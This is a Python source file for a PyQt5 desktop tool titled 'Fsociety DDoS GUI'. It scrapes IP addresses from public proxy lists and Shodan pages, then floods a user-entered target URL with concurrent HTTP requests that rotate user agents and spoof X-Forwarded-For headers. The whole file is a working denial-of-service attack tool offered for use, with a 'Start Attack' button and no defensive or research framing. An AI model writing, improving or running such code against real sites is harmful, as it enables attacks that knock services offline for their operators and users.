# ddos dev by vicouncil
import sys
import requests
import asyncio
import aiohttp
import random
import re
import itertools
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QMessageBox, QTextEdit
)
from PyQt5.QtGui import QPixmap, QPalette, QColor
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from io import BytesIO


UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",   
]

ip_list_urls = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.shodan.io/search?query=brazil",
    "https://www.shodan.io/search?query=germany",
    "https://www.shodan.io/search?query=france",
    "https://www.shodan.io/search?query=USA",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://geonode.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
    

]

class AttackThread(QThread):
    log_signal = pyqtSignal(str)  

    def __init__(self, target_url, num_requests):
        super().__init__()
        self.target_url = target_url
        self.num_requests = num_requests

    async def fetch_ip_addresses(self, url):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url) as response:
                    text = await response.text()
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                    return ip_addresses
            except Exception as e:
                self.log_signal.emit(f"Error fetching IP list from {url}: {e}")
                return []

    async def get_all_ips(self):
        tasks = [self.fetch_ip_addresses(url) for url in ip_list_urls]
        ip_lists = await asyncio.gather(*tasks)
        all_ips = [ip for sublist in ip_lists for ip in sublist]
        return all_ips

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(UserAgents),
            "X-Forwarded-For": ip_address
        }
        try:
            async with session.get(self.target_url, headers=headers) as response:
                self.log_signal.emit(f"fsociety> DDoS {self.target_url} from IP: {ip_address} - Status: {response.status}")
        except Exception as e:
            self.log_signal.emit(f"Error sending request from IP: {ip_address} - {e}")

    async def attack(self):
        ip_list = await self.get_all_ips()
        ip_cycle = itertools.cycle(ip_list)
        async with aiohttp.ClientSession() as session:
            tasks = [self.send_request(session, next(ip_cycle)) for _ in range(self.num_requests)]
            await asyncio.gather(*tasks)

    def run(self):
        asyncio.run(self.attack())

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Fsociety DDoS GUI")
        self.setGeometry(200, 200, 600, 600)

        self.setStyleSheet("background-color: black; color: white;")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        layout = QVBoxLayout()

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background-color: black; color: white;")
        layout.addWidget(self.log_output)

       
        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setStyleSheet("background-color: black;")
        layout.addWidget(self.image_label)
        
        image_url = "https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2016/08/avira_blog_mr.robot-header.jpg"
        self.load_image(image_url)
        self.fsociety_label = QLabel("Fsociety ")
        self.fsociety_label.setStyleSheet("color: white; font-size: 24px; font-weight: bold; text-align: center;")
        self.fsociety_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.fsociety_label)

        self.url_label = QLabel("Target URL:")
        layout.addWidget(self.url_label)
        self.url_input = QLineEdit()
        layout.addWidget(self.url_input)

        self.requests_label = QLabel("Number of Requests:")
        layout.addWidget(self.requests_label)
        self.requests_input = QLineEdit()
        layout.addWidget(self.requests_input)

        self.start_button = QPushButton("Start Attack")
        self.start_button.clicked.connect(self.start_attack)
        self.start_button.setStyleSheet("background-color: grey; color: white;")
        layout.addWidget(self.start_button)

        central_widget.setLayout(layout)

    def log_message(self, message):
        self.log_output.append(message)

    def load_image(self, image_url):
        try:
            response = requests.get(image_url)
            response.raise_for_status()
            pixmap = QPixmap()
            pixmap.loadFromData(BytesIO(response.content).getvalue())
            self.image_label.setPixmap(pixmap.scaled(400, 400, Qt.KeepAspectRatio))  
        except Exception as e:
            self.log_message(f"Error loading image: {e}")

    def start_attack(self):
        target_url = self.url_input.text()
        try:
            num_requests = int(self.requests_input.text())
        except ValueError:
            QMessageBox.critical(self, "Fsociety DDoS", "Number of requests must be an integer.")
            return

        if not target_url or num_requests <= 0:
            QMessageBox.critical(self, "Fsociety DDoS", "Please provide a valid URL and number of requests.")
            return

        self.log_message("Attack started.")

        self.attack_thread = AttackThread(target_url, num_requests)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.start()
        QMessageBox.information(self, "Fsociety DDoS", "Attack started! Check logs.")

app = QApplication(sys.argv)
window = MainWindow()
window.show()
sys.exit(app.exec_())
